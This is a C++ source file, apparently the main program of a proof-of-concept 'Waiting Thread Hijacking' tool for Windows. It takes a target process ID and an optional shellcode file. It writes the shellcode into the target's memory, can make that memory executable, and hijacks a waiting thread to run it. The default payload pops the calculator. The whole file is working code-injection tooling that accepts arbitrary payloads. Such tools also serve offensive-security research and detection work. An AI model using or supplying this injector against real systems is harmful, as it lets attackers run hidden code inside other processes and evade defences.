#include <windows.h>
#include <iostream>

#include "hijacking.h"
#include "common.h"
#include "ntddk.h"

#include "shellcode.h"

DWORD g_WaitReason = WrQueue;

BYTE* wrap_shellcode1(IN BYTE* raw_shellcode, IN size_t raw_shellcode_size, OUT size_t& wrapped_shc_size)
{
    if (!raw_shellcode_size) {
        return nullptr;
    }
    const size_t full_size = sizeof(g_shellcode_stub) + raw_shellcode_size;
    BYTE* full_shc = (BYTE*)::calloc(full_size, 1);
    if (!full_shc) {
        return nullptr;
    }
    wrapped_shc_size = full_size;
    ::memcpy(full_shc, g_shellcode_stub, sizeof(g_shellcode_stub));
    ::memcpy(full_shc + sizeof(g_shellcode_stub), raw_shellcode, raw_shellcode_size);
    return full_shc;
}

BYTE* wrap_shellcode2(OUT size_t& wrapped_shc_size, LPVOID shellc2)
{
    const size_t full_size = sizeof(g_shellcode_stub) + sizeof(g_shellcode_create_thread);
    BYTE* full_shc = (BYTE*)::calloc(full_size, 1);
    if (!full_shc) {
        return nullptr;
    }
    wrapped_shc_size = full_size;
    ::memcpy(full_shc, g_shellcode_stub, sizeof(g_shellcode_stub));
    ::memcpy(full_shc + sizeof(g_shellcode_stub), g_shellcode_create_thread, sizeof(g_shellcode_create_thread));

    //fill address:
    const size_t kAddrOffset = 0xe9;
    BYTE* pattern_ptr = full_shc + sizeof(g_shellcode_stub) + kAddrOffset;
    ::memcpy(pattern_ptr, &shellc2, sizeof(shellc2));
    return full_shc;
}

inline bool execute_injection(DWORD processID, BYTE* shellcode_buf, size_t shellcode_size)
{
    LPVOID shellcodePtr = alloc_memory_in_process(processID, shellcode_size);
    if (!write_buf_into_process(processID, shellcodePtr, shellcode_buf, shellcode_size)) {
        return false;
    }
    return run_injected(processID, (ULONG_PTR)shellcodePtr, shellcode_size, g_WaitReason);
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        std::cout << "Waiting Thread Hijacking. Target Wait Reason: " << KWAIT_REASON_TO_STRING(g_WaitReason) << "\n"
            << "Arg <PID> [shellcode_file*] [new_thread*]\n"
            << "* - optional; requires shellcode with clean exit\n"
            << "* - optional: if not 0, the passed shellcode will be run in a new thread"
            << std::endl;
        return 0;
    }
    int new_thread = 0;
    BYTE* payload = g_shellcode_pop_calc;
    size_t payload_size = sizeof(g_shellcode_pop_calc);
    if (argc > 2) {
        char* filename = argv[2];
        payload = load_from_file(filename, payload_size);
        if (!payload) {
            std::cerr << "Failed loading shellcode from file: " << filename << std::endl;
            return (-1);
        }
        std::cout << "Using payload from file: " << filename << std::endl;
    }
    if (argc > 3) {
        new_thread = loadInt(argv[3], false);
    }
    DWORD processID = loadInt(argv[1], false);
    if (!processID) {
        std::cerr << "No process ID supplied!\n";
        return -1;
    }
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
    if (!hProcess) {
        std::cerr << "Failed opening the process!\n";
        return 0;
    }
    CloseHandle(hProcess);
    size_t shellc_size = 0;
    BYTE* shellc_buf = nullptr;

    if (new_thread) {
        std::cout << "The passed shellcode will run in a new thread\n";
        LPVOID shellc2 = alloc_memory_in_process(processID, payload_size);
        if (!write_buf_into_process(processID, shellc2, payload, payload_size)) {
            std::cerr << "Failed writing Shc2!\n";
            return (-2);
        }
        if (!protect_memory(processID, (LPVOID)shellc2, payload_size, PAGE_EXECUTE_READWRITE)) {
            std::cerr << "Failed making Shc2 memory executable!\n";
            return (-2);
        }
        std::cout << "Written Shellcode 2 at: " << std::hex << (ULONG_PTR)shellc2 << std::endl;
        shellc_buf = wrap_shellcode2(shellc_size, shellc2);
    }
    else {
        shellc_buf = wrap_shellcode1(payload, payload_size, shellc_size);
    }

    int status = 0;
    if (execute_injection(processID, shellc_buf, shellc_size)) {
        std::cout << "Done!\n";
    }
    else {
        std::cout << "Failed!\n";
        status = (-1);
    }
    return status;
}
